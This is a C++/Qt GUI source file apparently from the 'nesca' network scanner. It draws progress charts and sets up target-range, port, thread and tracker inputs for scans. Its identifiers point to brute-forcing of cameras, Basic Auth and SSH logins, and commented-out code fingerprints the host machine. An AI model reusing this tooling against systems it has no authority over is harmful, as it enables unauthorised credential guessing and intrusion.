﻿#include "nesca_3.h"
#include <QFileDialog>
#include "CheckKey_Th.h"
#include "DrawerTh_QoSScanner.h"
#include "STh.h"
#include "msgcheckerthread.h"
#include "vercheckerthread.h"
#include "DrawerTh_HorNet.h"
#include "ActivityDrawerTh_HorNet.h"
#include "DrawerTh_GridQoSScanner.h"
#include "DrawerTh_ME2Scanner.h"
#include "DrawerTh_VoiceScanner.h"
#include "piestat.h"
#include <QMenu>
#include <qdesktopservices.h>
#include <qmessagebox.h>
#include "progressbardrawer.h"
#include "FileDownloader.h"
#include <QCryptographicHash>
#include <algorithm>
#include <sstream>
#include <iostream>
#include <iterator>
#include <iomanip>

#if defined(WIN32)
	#include <sys/types.h>
	#include <intrin.h>
#endif

#include <MainStarter.h>
#include <string>
#include <sstream>
#include <iomanip>
#include <QtGui/qvalidator.h>
#include <QtWidgets/qtextbrowser.h>
#include "Utils.h"
#include <QPushButton>
#include <QLabel>
#include <QtWidgets/qlineedit.h>
#include <QtWidgets/qheaderview.h>
#include <qclipboard.h>

NET_DVR_Init hik_init_ptr = NULL;
NET_DVR_Cleanup hik_cleanup_ptr = NULL;
NET_DVR_Login_V30 hik_login_ptr = NULL;

QDate date = QDate::currentDate();
int ver = 100*(100*(date.year()%100) + date.month()) + date.day();
#define VER 130706
#define WIDGET_WIDTH 500

bool HTMLDebugMode = false;
bool code160 = false;
bool gDebugMode = false;
bool gNegDebugMode = false;
bool smBit_1 = false;
bool smBit_2 = false;
bool smBit_3 = false;
bool smBit_4 = false;
bool smBit_5 = false;
bool smBit_6 = false;
bool smBit_7 = false;
bool smBit_8 = false;
char gVER[32] = {0};
int globalPinger = 0;
int nesca_3::savedTabIndex = 0;

bool startFlag = false;
bool trackerOK = false;
char trcPort[32] = {0};
char trcSrvPortLine[32] = {0};
char trcProxy[128] = {0};
char trcSrv[256] = {0};
char trcScr[256] = {0};
char trcPersKey[64] = {0};
char gProxyIP[64] = {0};
char gProxyPort[8] = {0};

VerCheckerThread *vct = new VerCheckerThread();
MSGCheckerThread *mct = new MSGCheckerThread();
STh *stt = new STh();
DrawerTh_HorNet *dtHN = new DrawerTh_HorNet();
DrawerTh_ME2Scanner *dtME2 = new DrawerTh_ME2Scanner();
DrawerTh_QoSScanner *dtQoS = new DrawerTh_QoSScanner();
DrawerTh_GridQoSScanner *dtGridQoS = new DrawerTh_GridQoSScanner();
CheckKey_Th *chKTh = new CheckKey_Th();
ActivityDrawerTh_HorNet *adtHN = new ActivityDrawerTh_HorNet();
DrawerTh_VoiceScanner *vsTh = new DrawerTh_VoiceScanner();
PieStat *psTh = new PieStat();

bool MapWidgetOpened = false;
bool globalScanFlag;
float QoSStep = 1;
QGraphicsScene *sceneGrid;
QGraphicsScene *sceneGrid2;
QGraphicsScene *sceneGraph;
QGraphicsScene *sceneUpper;
QGraphicsScene *sceneActivity;
QGraphicsScene *sceneActivityGrid;
QGraphicsScene *sceneTextPlacer;
QGraphicsScene *sceneVoice;
QGraphicsScene *jobRangeVisualScene;

QString importFileName = "";
	
QSystemTrayIcon *tray;
	QTextCodec *codec = QTextCodec::codecForName("Windows-1251");

QWidget *qwm;
PopupMsgWidget *msgWdgt;

QPen rpen(QColor(255, 0, 0, 190), 0.1, Qt::DotLine);
QPen pen(QColor(130, 130, 130), 0.1, Qt::DotLine);
QPen pen2(QColor(130, 130, 130), 0.5);
QPen penQoS0(QColor(255, 255, 255), 0.8);
QPen penQoS1(QColor(255, 0, 0), 0.9);
QPen penQoS2(QColor(0, 255, 0), 0.8);
QPen penQoS3(QColor(255, 85, 0), 0.8);	//orange
QPen penQoS4(QColor(255, 0, 255), 0.8);	//violet
QPen penQoS5(QColor(0, 0, 255), 0.8);
QPen penQoS6(QColor(82,180,229), 0.8);	//sky-blue
QPen penQoS7(QColor(85,0,0), 0.8);	//dRed
QPen penQoSWhite(QColor(255,255,255), 0.2);
QPen penQoSBlack(QColor(0,0,0), 0.3);
QPen penBlack(QColor(0,0,0));
QPen pen2i;

QVector<QGraphicsPathItem*> vectOld;
QList<int> lstOfLabels;
QVector<int> actLst;
QVector<int> vAlivLst;
QVector<int> vAnomLst;
QVector<int> vWFLst;
QVector<int> vSuspLst;
QVector<int> vLowlLst;
QVector<int> vBALst;
QVector<int> vSSHLst;
QVector<int> vOvrlLst;

QMenu *menuPS;

QVector<QRect> NodeDots;
QVector<QString> NodeAddrs;
const nesca_3 *gthis;
bool BALogSwitched = false;
bool widgetIsHidden = false;
bool ME2ScanFlag = true, QoSScanFlag = false, VoiceScanFlag = false, PieStatFlag = false;

QVector<qreal> dots;
QVector<qreal> dotsThreads;
QFont multiFontSmallFontPie;
QFont multiFontSmallFontArc;


int PekoWidget::m_xPos = 305;
int PekoWidget::m_yPos = 0;
int PekoWidget::m_windowCounter = 0;
int PekoWidget::offset = 0;

//
//int psh_lul(PIP_ADAPTER_INFO zzaza)
//{
//	int chc = 0;
//	for (int i = 0; i < zzaza->AddressLength; i++) chc += (zzaza->Address[i] << ((i & 1) * 8));
//	return chc;
//}
//void hshjNune(int& mac1, int& mac2)
//{
//	IP_ADAPTER_INFO idrigenopho[32];
//	DWORD dwBufLen = sizeof(idrigenopho);
//	DWORD dwStatus = GetAdaptersInfo(idrigenopho, &dwBufLen);
//	if (dwStatus != ERROR_SUCCESS) return;
//	PIP_ADAPTER_INFO pidrigenopho = idrigenopho;
//	mac1 = psh_lul(pidrigenopho);
//	if (pidrigenopho->Next) mac2 = psh_lul(pidrigenopho->Next);
//}
//int hsh_hsh()
//{
//	DWORD psm = 0;
//	GetVolumeInformation("C:\\", NULL, 0, &psm, NULL, NULL, NULL, 0);
//	int ypyp = (int)((psm + (psm >> 16)) & 0xFFFF);
//	return ypyp;
//}
//const char* fds_gds()
//{
//	static char computerName[1024];
//	DWORD size = 1024;
//	GetComputerName(computerName, &size);
//	static char cn[1024];
//	for (int i = 0, j = 0; i < 512; i += 2, ++j) memset(cn + j, computerName[i], 1);
//	return cn;
//}
//std::string grgNun() {
//	DWORD Type;
//	char value[64] = { 0 };
//	HKEY hkey;
//	if (RegOpenKey(HKEY_LOCAL_MACHINE,
//		TEXT("Software\\ISKOPASI\\nesca3\\jipjip"), &hkey) == ERROR_SUCCESS)
//	{
//		DWORD value_length = 256;
//		RegQueryValueEx(hkey, "nepnep", 0, &Type, (BYTE*)&value, &value_length);
//		RegCloseKey(hkey);
//	}
//
//	std::string rNepnep = std::string(value);
//	return rNepnep;
//}
//std::string ypypNunu()
//{
//	int fafa1, faf2;
//	hshjNune(fafa1, faf2);
//	int d2 = hsh_hsh();
//	char fds[1024] = { 0 };
//	strcpy(fds, fds_gds());
//	const std::string resNunu = std::to_string(fafa1) + "-"
//		+ std::to_string(d2) + "-" + std::string(fds) + "-"
//		+ std::string(trcPersKey);
//
//	std::ostringstream strNunu;
//	strNunu << std::setw(2) << std::setfill('0') << std::hex << std::uppercase;
//	std::copy(resNunu.begin(), resNunu.end(), std::ostream_iterator<unsigned int>(strNunu, ""));
//	return strNunu.str();
//}
//
//
void _LoadPersInfoToLocalVars(int savedTabIndex) {
	//ZeroMemory(trcPersKey, sizeof(trcPersKey));
	trcPersKey[0] = 0;
	strncpy(trcPersKey, ui->linePersKey->text().toLocal8Bit().data(), 32);
	memset(trcPersKey + 32, '\0', 1);
	currentIP[0] = 0;
	finalIP[0] = 0;
	gPorts[0] = 0;
	gTLD[0] = 0;
	//ZeroMemory(currentIP, sizeof(currentIP));
	//ZeroMemory(finalIP, sizeof(finalIP));
	//ZeroMemory(gPorts, sizeof(gPorts));
	//ZeroMemory(gTLD, sizeof(gTLD));

	if (savedTabIndex == 0)
	{
		gMode = 0;
		gThreads = ui->threadLine->text().toInt();
		QString targetLine = ui->ipLine->text();

		if (ui->ipLine->text().indexOf("-") > 0)
		{
			if (ui->ipLine->text().indexOf("/") < 0) {
				QList<QString> splittedTargetLine = targetLine.split("-");
				strcpy(currentIP, splittedTargetLine[0].toLocal8Bit().data());
				strcpy(finalIP, splittedTargetLine[1].toLocal8Bit().data());
			}
		}
		else
		{
			if (ui->ipLine->text().indexOf("/") < 0)
			{
				sprintf(currentIP, "%s-%s",
					ui->ipLine->text().toLocal8Bit().data(), ui->ipLine->text().toLocal8Bit().data());
			}
			else {
				sprintf(currentIP, "%s",
					ui->ipLine->text().toLocal8Bit().data());
			}
		};

		strncpy(gPorts, ("-p" + ui->ipmPortLine->text()).toLocal8Bit().data(), 65536);
		gPorts[ui->ipmPortLine->text().length() + 2] = '\0';
	}
	else if (savedTabIndex == 1)
	{
		gMode = 1;
		gThreads = ui->lineEditThread->text().toInt();

		strcpy(currentIP, ui->dnsLine->text().toLocal8Bit().data());
		strcpy(gTLD, ui->lineILVL->text().toLocal8Bit().data());
		strncpy(gPorts, ("-p" + ui->dnsPortLine->text()).toLocal8Bit().data(), 65536);
		gPorts[ui->dnsPortLine->text().length() + 2] = '\0';
	}
	else if (savedTabIndex == 2)
	{
		gMode = -1;
		gThreads = ui->importThreads->text().toInt();
		strncpy(gPorts, ("-p" + ui->importPortLine->text()).toLocal8Bit().data(), 65536);
		gPorts[ui->importPortLine->text().length() + 2] = '\0';
	};

	strcpy(trcSrv, ui->lineTrackerSrv->text().toLocal8Bit().data());
	strcpy(trcScr, ui->lineTrackerScr->text().toLocal8Bit().data());
	strncpy(trcPersKey, ui->linePersKey->text().toLocal8Bit().data(), 32);
	memset(trcPersKey + 32, '\0', 1);
	strcpy(trcSrvPortLine, ui->trcSrvPortLine->text().toLocal8Bit().data());
	strncpy(gProxyIP, ui->systemProxyIP->text().toLocal8Bit().data(), 64);
	gProxyIP[ui->systemProxyIP->text().size()] = '\0';
	strncpy(gProxyPort, ui->systemProxyPort->text().toLocal8Bit().data(), 8);
	gProxyPort[ui->systemProxyPort->text().size()] = '\0';
}

Ui::nesca_3Class *ui = new Ui::nesca_3Class;
QGraphicsScene *testScene;

qreal sharedY = 50;
qreal sharedheight = sharedY + 120;
QPen penAllThreads(QColor(255,255,255, 30), 10, Qt::CustomDashLine);
QPen penThreads(QColor(82,180,229), 10, Qt::SolidLine);
QPen penBAThreads(QColor(250,32,61), 5, Qt::CustomDashLine);
QPen penAllTargets(QColor(255,255,255, 30), 10, Qt::SolidLine);
QPen penTargets(QColor(250,94,32), 6, Qt::SolidLine);
QPen penSaved(QColor(72,255,0), 3, Qt::SolidLine);
void nesca_3::drawVerboseArcs(unsigned long gTargets) {
	testScene->clear();
	qreal leftX = 185;
	qreal rightX = -165;
	int fSz = 10;

	QPainterPath pathAllThreads;
	pathAllThreads.arcMoveTo(leftX, sharedY, rightX, sharedheight, 0);
	pathAllThreads.arcTo(leftX, sharedY, rightX, sharedheight, 0, 180);
	QGraphicsPathItem* itmAllThreads = new QGraphicsPathItem(pathAllThreads);
	itmAllThreads->setPen(penAllThreads);
	testScene->addItem(itmAllThreads);

	QPainterPath pathThreads;
	pathThreads.arcMoveTo(leftX, sharedY, rightX, sharedheight, 0);
	pathThreads.arcTo(leftX, sharedY, rightX, sharedheight, 0, cons*((float)(180/(float)gThreads)));
	QGraphicsPathItem* itmThreads = new QGraphicsPathItem(pathThreads);
	itmThreads->setPen(penThreads);
	testScene->addItem(itmThreads);

	fSz = 5;
	QPainterPath pathBAThreads;
	pathBAThreads.arcMoveTo(leftX, sharedY, rightX, sharedheight, 0);
	pathBAThreads.arcTo(leftX, sharedY, rightX, sharedheight, 0, BrutingThrds*((float)(180/(float)gThreads)));
	QGraphicsPathItem* itmBAThreads = new QGraphicsPathItem(pathBAThreads);
	itmBAThreads->setPen(penBAThreads);
	testScene->addItem(itmBAThreads);

	fSz = 10;
	int xOffsetl = fSz + 2;
	int xOffsetr = xOffsetl * 2;
	leftX += xOffsetl;
	rightX -= xOffsetr;
	qreal sharedheight1 = sharedheight - xOffsetl;
	qreal sharedheight2 = sharedheight + xOffsetr;
	qreal nSharedY = sharedY - xOffsetl;

	QPainterPath pathAllTargets;
	pathAllTargets.arcMoveTo(leftX, sharedY, rightX, sharedheight1, 0);
	pathAllTargets.arcTo(leftX, nSharedY, rightX, sharedheight2, 0, 180);
	QGraphicsPathItem* itmAllTargets = new QGraphicsPathItem(pathAllTargets);
	itmAllTargets->setPen(penAllTargets);
	testScene->addItem(itmAllTargets);

	fSz = 6;
	QPainterPath pathTargets;
	pathTargets.arcMoveTo(leftX, sharedY, rightX, sharedheight1, 0);
	pathTargets.arcTo(leftX, nSharedY, rightX, sharedheight2, 0, indexIP*((float)(180/(float)gTargetsNumber)));
	QGraphicsPathItem* itmTargets = new QGraphicsPathItem(pathTargets);
	itmTargets->setPen(penTargets);
	testScene->addItem(itmTargets);

	fSz = 3;
	QPainterPath pathSaved;
	pathSaved.arcMoveTo(leftX, sharedY, rightX, sharedheight1, 0);
	pathSaved.arcTo(leftX, nSharedY, rightX, sharedheight2, 0, saved*((float)(180/(float)gTargetsNumber)));
	QGraphicsPathItem* itmSaved = new QGraphicsPathItem(pathSaved);
	itmSaved->setPen(penSaved);
	testScene->addItem(itmSaved);

	ui->ipLabel->setText(QString(currentIP));
	ui->labelSavedValue->setText(QString::number(saved));
	ui->labelPendingTargets->setText(QString::number(gTargets));
	ui->labelRunningThreads->setText(QString::number(cons) + "|" +
									 QString::number(BrutingThrds) + "|" +
									 QString::number(gThreads));
}

void setSceneArea()
{
	delete ui->graphicsVoice;
	ui->graphicsVoice = new PieStatView(ui->widget);
	ui->graphicsVoice->setObjectName(QStringLiteral("graphicsVoice"));
	ui->graphicsVoice->setGeometry(QRect(220, 265, 270, 100));
	ui->graphicsVoice->setStyleSheet(QStringLiteral("border:1px solid white;background-color: rgba(26, 26,26, 0);"));
	ui->graphicsVoice->setVerticalScrollBarPolicy(Qt::ScrollBarAlwaysOff);
	ui->graphicsVoice->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOff);
	ui->graphicsVoice->setRenderHints(QPainter::TextAntialiasing);
	ui->graphicsVoice->setCacheMode(QGraphicsView::CacheNone);
	ui->graphicsVoice->raise();

	sceneGrid = new QGraphicsScene();
	sceneGrid2 = new QGraphicsScene();
	sceneGraph = new QGraphicsScene();
	sceneUpper = new QGraphicsScene();
	sceneUpper->setSceneRect(0, 0, ui->graphicLog_Upper->width(), ui->graphicLog_Upper->height());
	sceneGrid->setSceneRect(0, 0, ui->graphicLog_Upper->width(), ui->graphicLog_Upper->height());

	QLinearGradient gradient(0, 0, 0, 94);
	gradient.setColorAt(0, QColor(255, 0, 0));
	gradient.setColorAt(0.7, QColor(255, 0, 0));
	gradient.setColorAt(0.85, QColor(255, 255, 0));
	gradient.setColorAt(0.9, QColor(0, 255, 0));
	gradient.setColorAt(1, QColor(255, 255, 255, 60));
	pen2i.setBrush(gradient);
	sceneGraph->setItemIndexMethod(QGraphicsScene::NoIndex);

	sceneActivity = new QGraphicsScene();
	sceneActivityGrid = new QGraphicsScene();
	sceneTextPlacer = new QGraphicsScene();
	sceneVoice = new QGraphicsScene();
	jobRangeVisualScene = new QGraphicsScene();

	ui->graphicLog->setScene(sceneGrid);
	ui->graphicLog_2->setScene(sceneGraph);
	ui->graphicDelim->setScene(sceneGrid2);
	ui->graphicLog_Upper->setScene(sceneUpper);
	ui->graphicActivity->setScene(sceneActivity);
	ui->graphicActivityGrid->setScene(sceneActivityGrid);
	ui->graphicTextPlacer->setScene(sceneTextPlacer);
	ui->graphicsVoice->setScene(sceneVoice);
	ui->jobRangeVisual->setScene(jobRangeVisualScene);
	
	ui->graphicLog->setSceneRect(0, 0, ui->graphicLog->width(), ui->graphicLog->height());
	ui->graphicLog_2->setSceneRect(0, 0, ui->graphicLog_2->width(), ui->graphicLog_2->height());
	ui->graphicDelim->setSceneRect(0, 0, ui->graphicDelim->width(), ui->graphicDelim->height());
	ui->graphicLog_Upper->setSceneRect(0, 0, ui->graphicLog_Upper->width(), ui->graphicLog_Upper->height());
	ui->graphicActivity->setSceneRect(0, 0, ui->graphicActivity->width(), ui->graphicActivity->height());
	ui->graphicActivityGrid->setSceneRect(0, 0, ui->graphicActivityGrid->width(), ui->graphicActivityGrid->height());
	ui->graphicTextPlacer->setSceneRect(0, 0, ui->graphicTextPlacer->width(), ui->graphicTextPlacer->height());
	ui->graphicsVoice->setSceneRect(0, 0, ui->graphicsVoice->width(), ui->graphicsVoice->height());
	ui->jobRangeVisual->setSceneRect(0, 0, ui->jobRangeVisual->width(), ui->jobRangeVisual->height());


	testScene = new QGraphicsScene();
	ui->graphicsTest->setScene(testScene);
	ui->graphicsTest->setSceneRect(0, 0, ui->graphicsTest->width(), ui->graphicsTest->height());
	ui->graphicsTest->setRenderHints(QPainter::Antialiasing | QPainter::SmoothPixmapTransform | QPainter::HighQualityAntialiasing);
}

void setButtonStyleArea()
{
	ui->checkKeyBut->setStyleSheet(
		" #checkKeyBut {"
		"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
		"color: #00b304;"
		"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
		"}"

		" #checkKeyBut:hover{"
		"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
		"color: #1efd00;"
		"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
		"}"
		);
	ui->importButton->setStyleSheet(
		" #importButton {"
		"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
		"color: #00b304;"
		"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
		"}"

		" #importButton:hover{"
		"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
		"color: #1efd00;"
		"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
		"}"
		);
	ui->startScanButton_3->setStyleSheet(
		" #startScanButton_3 {"
		"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
		"color: #919191;"
		"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
		"}"

		" #startScanButton_3:hover{"
		"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
		"color: #D1D1D1;"
		"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
		"}"
		);

	ui->startScanButton_4->setStyleSheet(
		" #startScanButton_4 {"
		"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
		"color: #919191;"
		"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
		"}"

		" #startScanButton_4:hover{"
		"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
		"color: #D1D1D1;"
		"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
		"}"
		);
}

void setSomeStyleArea()
{
	qApp->setStyleSheet(
		"QMenu{"
		"color:rgb(216, 216, 216);background-color: rgb(26, 26, 26); border: 1px solid white;"
		"}"		

		".a{"
		"color:rgb(216, 216, 216);background-color: rgb(26, 26, 26); border: 1px solid white;"
		"}"

		"QMenu::item {"
		"padding: 2px 25px 2px 25px;"
		"border: 1px solid transparent;"
		"}"

		"QMenu::item:disabled {"
		"color:rgb(35, 35, 35);background-color: rgb(26, 26, 26); border: 1px solid white;"
		"padding: 2px 25px 2px 25px;"
		"border: 1px solid transparent;"
		"}"

		"QMenu::item:selected:enabled {"
		"color:rgb(255, 255, 255);background-color: rgb(26, 26, 26); border: 1px solid white;"
		"border-color: rgb(250, 170, 60);"
		"background: rgba(250, 170, 60, 50);"
		"}"

		"QMenu::item:selected:disabled {"
		"color:rgb(35, 35, 35);background-color: rgb(26, 26, 26); border: 1px solid white;"
		"border-color: rgb(250, 170, 60);"
		"background: rgba(250, 170, 60, 50);"
		"}"

		"QMenu::separator {"
		"height: 2px;"
		"margin-left: 25px;"
		"}"

		"QMenu::indicator {"
		"width: 13px;"
		"height: 13px;"
		"}"
		
		" #widget {"
		"border: 1px solid #525252;"
		"border-radius: 0px;"
		"}"
		
		" #exitButton {"
		"color: #525252;"
		"border: 0px solid black;"
		"}"

		" #exitButton:hover {"
		"color: red;"
		"border: 0px solid black;"
		"}"

		" #exitButton:pressed {"
		"color: maroon;"
		"border: 0px solid black;"
		"}"

		" #trayButton {"
		"color: #525252;"
		"border: 0px solid black;"
		"}"

		" #trayButton:hover {"
		"color: red;"
		"border: 0px solid black;"
		"}"

		" #trayButton:pressed {"
		"color: maroon;"
		"border: 0px solid black;"
		"}"

		" #exitButton_2 {"
		"color: #525252;"
		"border: 0px solid black;"
		"}"

		" #exitButton_2:hover {"
		"color: red;"
		"border: 0px solid black;"
		"}"

		" #exitButton_2:pressed {"
		"color: maroon;"
		"border: 0px solid black;"
		"}"

		" QLineEdit {"
		"border: 1px solid #525252 !important;"
		"border-radius: 0px !important;"
		"padding: 0 8px !important;"
		"background: yellow !important;"
		"selection-background-color: darkgray !important;"
		"}"

		"QTabBar::tab {"
		"color: white;"
		"border: 1px solid #C4C4C3;"
		"border-bottom-color: #C2C7CB;"
		"border-top-left-radius: 4px;"
		"border-top-right-radius: 4px;"
		"padding: 1px 3px;"
		"margin-left: 1px;"
		"margin-bottom: 4px;"
		"}"

		"QTabBar::tab:selected {"
		"color: black;"
		"background-color: #505050;"
		"}"

		"QCheckBox::indicator:unchecked"
		"{"
		"background-color:black;"
		"border: 1px solid #313131;"
		"}"

		"QCheckBox::indicator:checked"
		"{"
		"background-color: qradialgradient(spread:pad, cx:0.5, cy:0.5, radius:0.5, fx:0.5, fy:0.500318, stop:0.107955 rgba(255, 255, 255, 255), stop:0.204545 rgba(255, 255, 255, 0));"
		"border: 1px solid #313131;"
		"}"
		);
	setButtonStyleArea();
}

void SetValidators()
{
	QRegExpValidator *validator = new QRegExpValidator(
		QRegExp("([\\d*|.|//|-])+"), 
		NULL
		);

	ui->ipLine->setValidator(validator);

	validator = new QRegExpValidator(QRegExp("\\d{1,3}"), NULL);
	ui->importThreads->setValidator(validator);
	ui->threadLine->setValidator(validator);
	ui->lineEditThread->setValidator(validator);
	ui->iptoLine_value->setValidator(validator);
	ui->iptoLine_value_2->setValidator(validator);
	ui->iptoLine_value_3->setValidator(validator);
	ui->maxBrutingThrBox->setValidator(validator);

	validator = new QRegExpValidator(QRegExp("\\d{1,5}"), NULL);
	ui->PingTO->setValidator(validator);
	ui->threadDelayBox->setValidator(validator);
	
	validator = new QRegExpValidator(QRegExp("(\\w|-|\\.|\\[|\\]|\\\\)+"), NULL);
	ui->dnsLine->setValidator(validator);

	validator = new QRegExpValidator(QRegExp("(\\w|-|\\.)+((\\w|-|\\.)+)+"), NULL);
	ui->lineILVL->setValidator(validator);

	validator = new QRegExpValidator(QRegExp("\\d{1,5}"), NULL);
	ui->trcSrvPortLine->setValidator(validator);
	
	validator = new QRegExpValidator(QRegExp("[a-zA-Z0-9]{32}"), NULL);
	ui->linePersKey->setValidator(validator);
}

void nesca_3::slotDrawTextPlacers()
{
	QFont fnt;
	fnt.setFamily("Eurostile");
	if(ME2ScanFlag)
	{
		delete sceneTextPlacer;
		sceneTextPlacer = NULL;
		sceneTextPlacer = new QGraphicsScene();
		ui->graphicTextPlacer->setScene(sceneTextPlacer);

		sceneTextPlacer->clear();
		QPen penPT(QColor(255, 255, 255), 0.5, Qt::SolidLine, Qt::SquareCap, Qt::RoundJoin);

		ui->RedLabel->setVisible(false);
		ui->GreenLabel->setVisible(false);
		ui->CyanLabel->setVisible(false);
		ui->BlueLabel->setVisible(false);
		ui->PinkLabel->setVisible(false);
		ui->YellowLabel->setVisible(false);
		ui->WhiteLabel->setVisible(false);
		ui->DredLabel->setVisible(false);

		ui->labelAnomaly->setVisible(false);
		ui->labelBA->setVisible(false);
		ui->labelFiltered->setVisible(false);
		ui->labelBads->setVisible(false);
		ui->labelLowloads->setVisible(false);
		ui->labelOverloads->setVisible(false);
		ui->labelAlives->setVisible(false);
		ui->labelSSH->setVisible(false);

		fnt.setPixelSize(10);

		sceneTextPlacer->addLine(85, 110,  90, 100, penPT);
		sceneTextPlacer->addLine(23, 110,  83, 110, penPT);
		
		int linuxOffsetKOSTYL = 0;
#if (!defined(WIN32) && !defined(_WIN32) && !defined(__WIN32)) || defined(__CYGWIN__)
		linuxOffsetKOSTYL = 3;
#endif

	QGraphicsTextItem *item = sceneTextPlacer->addText("- Cameras", fnt);
		item->setX(25);
		item->setY(94+linuxOffsetKOSTYL);
		item->setDefaultTextColor(QColor(255, 255, 255, 180));

		sceneTextPlacer->addLine(118, 120,  130, 100, penPT);
		sceneTextPlacer->addLine(23, 121,  117, 121, penPT);
	item = sceneTextPlacer->addText("- --", fnt);
		item->setX(25);
		item->setY(105+linuxOffsetKOSTYL);
		item->setDefaultTextColor(QColor(255, 255, 255, 180));

		sceneTextPlacer->addLine(155, 130,  170, 100, penPT);
		sceneTextPlacer->addLine(23, 131,  154, 131, penPT);
	item = sceneTextPlacer->addText("- Basic Auth", fnt);
		item->setX(25);
		item->setY(115+linuxOffsetKOSTYL);
		item->setDefaultTextColor(QColor(255, 255, 255, 180));

		sceneTextPlacer->addLine(190, 140, 210, 100, penPT);
		sceneTextPlacer->addLine(23, 141,  189, 141, penPT);
	item = sceneTextPlacer->addText("- Other", fnt);
		item->setX(25);
		item->setY(125+linuxOffsetKOSTYL);
		item->setDefaultTextColor(QColor(255, 255, 255, 180));

		sceneTextPlacer->addLine(230, 150, 250, 100, penPT);
		sceneTextPlacer->addLine(23, 151,  229, 151, penPT);
	item = sceneTextPlacer->addText("- Overloads", fnt);
		item->setX(25);
		item->setY(135+linuxOffsetKOSTYL);
		item->setDefaultTextColor(QColor(255, 255, 255, 180));

		sceneTextPlacer->addLine(270, 160, 290, 100, penPT);	
		sceneTextPlacer->addLine(23, 161,  269, 161, penPT);
	item = sceneTextPlacer->addText("- --", fnt);
		item->setX(25);
		item->setY(145+linuxOffsetKOSTYL);
		item->setDefaultTextColor(QColor(255, 255, 255, 180));

		sceneTextPlacer->addLine(310, 170, 330, 100, penPT);	
		sceneTextPlacer->addLine(23, 171, 309, 171, penPT);
	item = sceneTextPlacer->addText("- Alive", fnt);
		item->setX(25);
		item->setY(155+linuxOffsetKOSTYL);
		item->setDefaultTextColor(QColor(255, 255, 255, 180));
	}
	else if(VoiceScanFlag)
	{
		sceneTextPlacer->clear();
		
		fnt.setPixelSize(8);

		int h = ui->graphicLog->height();

		delete sceneTextPlacer;
		sceneTextPlacer = NULL;
		sceneTextPlacer = new QGraphicsScene();
		ui->graphicTextPlacer->setScene(sceneTextPlacer);

		for(int i = 0; i < h; i += 10)
		{
			QGraphicsTextItem *item = sceneTextPlacer->addText(QString::number(i/10 + 1) + "-", fnt);
			if(i != 90) item->setX(46);
			else item->setX(42);
			item->setY(h - i - 11);
			item->setDefaultTextColor(QColor(255, 255, 255, 180));
		};
	};
}

void nesca_3::slotDrawDelimLines()
{
	int gHeight = ui->graphicLog->height();
	QPen penDelim(QColor(255, 0, 0), 0.5);
	QPen penDelim2(QColor(255, 0, 0, 60), 1);

	QLinearGradient gradient(0, 0, 0, 100);
	gradient.setColorAt(0, QColor(255,0,0, 60));
	gradient.setColorAt(0.5, QColor(255,0,0, 40));
	gradient.setColorAt(1, QColor(255,0,0, 0));
	penDelim2.setBrush(gradient);

	sceneGrid2->addLine(33, gHeight, 33, gHeight - 3, penDelim);
	sceneGrid2->addLine(73, gHeight, 73, gHeight - 3, penDelim); 
	sceneGrid2->addLine(113, gHeight, 113, gHeight - 3, penDelim); 
	sceneGrid2->addLine(153, gHeight, 153, gHeight - 3, penDelim);
	sceneGrid2->addLine(193, gHeight, 193, gHeight - 3, penDelim);
	sceneGrid2->addLine(233, gHeight, 233, gHeight - 3, penDelim);

	sceneGrid2->addRect(1, 0, 31, gHeight - 3, penDelim2);
	sceneGrid2->addRect(34, 0, 38, gHeight - 3, penDelim2);
	sceneGrid2->addRect(74, 0, 38, gHeight - 3, penDelim2);
	sceneGrid2->addRect(114, 0, 38, gHeight - 3, penDelim2);
	sceneGrid2->addRect(154, 0, 38, gHeight - 3, penDelim2);
	sceneGrid2->addRect(194, 0, 38, gHeight - 3, penDelim2);
	sceneGrid2->addRect(234, 0, 35, gHeight - 3, penDelim2);
}

QList<int> gLOL0;
QList<int> gLOL1;
QList<int> gLOL2;
